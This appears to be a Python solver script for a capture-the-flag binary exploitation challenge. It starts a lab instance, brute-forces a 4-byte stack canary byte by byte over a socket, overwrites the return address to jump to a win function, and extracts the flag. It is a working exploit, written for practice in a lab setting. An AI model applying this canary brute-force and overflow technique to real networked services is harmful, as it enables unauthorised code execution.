import sys, json, re, time, socket, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r"D:\ctf-index")
from cylab2 import CyLab

cy = CyLab(delay=0.8)
cy.login()
cy.req("PUT", "/api/challenges/260/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/260/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"([A-Za-z0-9][A-Za-z0-9.\-]*\.net)\s+`?(\d{4,5})", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)
WIN = 0x08049236


def attempt(payload):
    """envoie count=len(payload) puis payload ; retourne la reponse"""
    try:
        s = socket.create_connection((host, port), timeout=10)
        s.settimeout(5)
    except Exception as e:
        return None
    try:
        buf = b""
        while b"> " not in buf:
            c = s.recv(4096)
            if not c:
                break
            buf += c
        s.sendall(str(len(payload)).encode() + b"\n")
        buf2 = b""
        while b"Input> " not in buf2:
            c = s.recv(4096)
            if not c:
                break
            buf2 += c
        s.sendall(payload)
        out = b""
        t0 = time.time()
        while time.time() - t0 < 5:
            try:
                c = s.recv(4096)
                if not c:
                    break
                out += c
            except socket.timeout:
                break
        return out.decode("latin-1", "replace")
    except Exception:
        return None
    finally:
        s.close()


canary = b""
for k in range(4):
    found = None
    for b in range(256):
        payload = b"A" * 64 + canary + bytes([b])
        r = attempt(payload)
        if r is None:
            continue
        if "Stack Smashing" not in r:
            found = b
            print("canary[%d] = 0x%02x" % (k, b), flush=True)
            break
    if found is None:
        print("echec sur l'octet", k)
        break
    canary += bytes([found])
print("canary =", canary.hex())
if len(canary) == 4:
    payload = b"A" * 64 + canary + b"B" * 4 + b"C" * 4 + struct.pack("<I", WIN)
    print("payload final:", len(payload), "octets")
    r = attempt(payload)
    print("=== reponse ===")
    print((r or "")[:600])
    f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r or "")
    print("FLAG:", f.group(0) if f else None)
